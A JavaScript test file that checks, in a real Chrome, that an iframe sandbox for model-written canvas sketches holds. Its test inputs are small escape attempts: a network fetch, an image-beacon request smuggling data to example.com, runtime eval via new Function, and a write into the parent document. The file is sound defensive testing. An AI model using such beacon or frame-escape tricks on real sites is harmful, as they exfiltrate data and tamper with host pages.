/**
 * The frame a written piece runs in, tested by trying to get out of it.
 *
 * The unit tests pin the *shape* of the sandbox — the attribute, the policy,
 * the absence of `connect-src`. That is worth doing and it is not the same as
 * knowing the thing holds: jsdom executes nothing inside an iframe, so nothing
 * below a browser has ever run a line of a written piece, blocked a request or
 * refused a reach into the parent.
 *
 * So this runs real pieces that misbehave in the five ways that matter, in the
 * Chrome that is installed, and checks each one fails. It is the only proof of
 * R143 that is about behaviour rather than about strings, which is why it
 * gates the deploy.
 *
 * The harness is lifted out of the component rather than copied, because a
 * copy would keep passing after the real one changed — which is the failure
 * this whole file exists to notice.
 */
import assert from 'node:assert/strict';
import { readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { launchBrowser } from './browser.mjs';

const COMPONENT = 'src/app/features/atelier/sketch-preview.component.ts';

let browser;
let cannotRun = null;
let harness;

/** The harness as the component really defines it. */
function liftHarness() {
  const source = readFileSync(COMPONENT, 'utf8');
  const found = source.match(/const HARNESS = `([\s\S]*?)`;\n/);
  assert.ok(found, `could not find HARNESS in ${COMPONENT}`);
  return found[1];
}

/**
 * A page holding the frame, with the piece handed over the way the component
 * hands it over: by postMessage, never written into the markup.
 */
function host(code) {
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>host</title></head>
<body>
<iframe id="f" sandbox="allow-scripts" referrerpolicy="no-referrer"
        style="width:400px;height:300px"
        srcdoc="${harness.replace(/&/g, '&amp;').replace(/"/g, '&quot;')}"></iframe>
<script type="application/json" id="code">${JSON.stringify(code)}</script>
<script>
  window.__said = null;
  window.__refused = null;
  var frame = document.getElementById('f');
  var code = JSON.parse(document.getElementById('code').textContent);
  window.addEventListener('message', function (event) {
    if (event.source !== frame.contentWindow) return;
    if (event.data.kind === 'ready') {
      frame.contentWindow.postMessage({ kind: 'code', code: code }, '*');
    } else if (event.data.kind === 'refused') {
      window.__refused = event.data.directive;
    } else {
      window.__said = event.data;
    }
  });
</script>
</body></html>`;
}

/**
 * Runs one piece and reports what became of it, and of anything it asked for.
 *
 * `answered` is the only thing that distinguishes a block from a leak: a
 * refused load still produces a request record in Chrome and then fails, so
 * counting requests would call a working policy a hole.
 */
async function runPiece(code) {
  const page = await browser.newPage();
  const answered = [];
  page.on('response', (response) => {
    if (response.url().includes('example.com')) answered.push(response.url());
  });

  const file = join(tmpdir(), 'juanmamoreno-sketch-host.html');
  writeFileSync(file, host(code), 'utf8');
  await page.goto(`file:///${file.replace(/\\/g, '/')}`);
  await page
    .waitForFunction('window.__said !== null', null, { timeout: 10_000 })
    .catch(() => undefined);
  // Long enough for a request the piece wanted to make to have been made.
  await page.waitForTimeout(500);

  const said = await page.evaluate('window.__said');
  const refused = await page.evaluate('window.__refused');
  await page.close();
  return { kind: said?.kind ?? 'nothing', message: said?.message ?? '', refused, answered };
}

/** The 7B's real answer, trimmed. */
const A_REAL_PIECE = `class Piece {
  setup(ctx, width, height) {
    this.motes = [];
    this.pointer = { x: width / 2, y: height / 2 };
  }
  draw(ctx, frame) {
    ctx.fillStyle = '#0b0b0c';
    ctx.fillRect(0, 0, frame.width, frame.height);
    for (let i = 0; i < 100; i++) {
      if (!this.motes[i]) {
        this.motes[i] = { x: Math.random() * frame.width, y: Math.random() * frame.height };
      }
      this.motes[i].x += (this.pointer.x - this.motes[i].x) * frame.dt * 5;
      ctx.fillStyle = 'rgba(242, 232, 213, 0.7)';
      ctx.beginPath();
      ctx.arc(this.motes[i].x, this.motes[i].y, 2, 0, Math.PI * 2);
      ctx.fill();
    }
  }
}`;

describe('the frame a written piece runs in', () => {
  before(async () => {
    ({ browser, cannotRun } = await launchBrowser());
    harness = liftHarness();
  });

  after(async () => {
    await browser?.close();
  });

  it('runs a piece the model really wrote', async (t) => {
    if (cannotRun) return t.skip(cannotRun);

    const { kind, message } = await runPiece(A_REAL_PIECE);

    assert.equal(kind, 'running', `the piece did not run: ${message}`);
  });

  it('reports a piece that will not parse, rather than drawing nothing', async (t) => {
    if (cannotRun) return t.skip(cannotRun);

    const { kind } = await runPiece('class Piece { draw(ctx, frame) { ');

    assert.equal(kind, 'broken');
  });

  it('reports a throw in draw once, rather than sixty times a second', async (t) => {
    if (cannotRun) return t.skip(cannotRun);

    const { kind, message } = await runPiece(
      'class Piece { draw(ctx, frame) { this.nothing.at.all(); } }'
    );

    assert.equal(kind, 'broken');
    assert.match(message, /undefined/);
  });

  it('refuses a piece that asks the network for something', async (t) => {
    if (cannotRun) return t.skip(cannotRun);
    // The claim the whole design rests on: no `connect-src`, so a fetch has
    // nowhere to go.
    const { answered, refused } = await runPiece(
      "class Piece { draw(ctx, frame) { fetch('https://example.com/x'); } }"
    );

    assert.deepEqual(answered, [], 'something answered a piece that should have no network');
    assert.equal(refused, 'connect-src', 'the frame did not say it had refused anything');
  });

  it('refuses a piece that smuggles its request out as an image', async (t) => {
    if (cannotRun) return t.skip(cannotRun);
    // The way round a missing `connect-src`, and the reason the policy has no
    // `img-src` either. Measured at 74 attempts in half a second, all refused.
    const { answered, refused } = await runPiece(
      "class Piece { draw(ctx, frame) { new Image().src = 'https://example.com/p.gif?' + frame.t; } }"
    );

    assert.deepEqual(answered, [], 'an image beacon got out of the frame');
    assert.equal(refused, 'img-src');
  });

  it('refuses a piece that builds code at runtime', async (t) => {
    if (cannotRun) return t.skip(cannotRun);
    // `'unsafe-inline'` and `'unsafe-eval'` are different permissions, and only
    // the first is given. This is what notices if that ever stops being true.
    const { kind, message } = await runPiece(
      "class Piece { draw(ctx, frame) { new Function('return 1')(); } }"
    );

    assert.equal(kind, 'broken');
    assert.match(message, /Content Security Policy/);
  });

  it('refuses a piece that reaches into the page that hosts it', async (t) => {
    if (cannotRun) return t.skip(cannotRun);
    // The opaque origin, which is the half of the boundary that protects the
    // admin token rather than the network.
    const { kind, message } = await runPiece(
      'class Piece { draw(ctx, frame) { parent.document.title = "owned"; } }'
    );

    assert.equal(kind, 'broken');
    assert.match(message, /Blocked a frame with origin "null"/);
  });
});
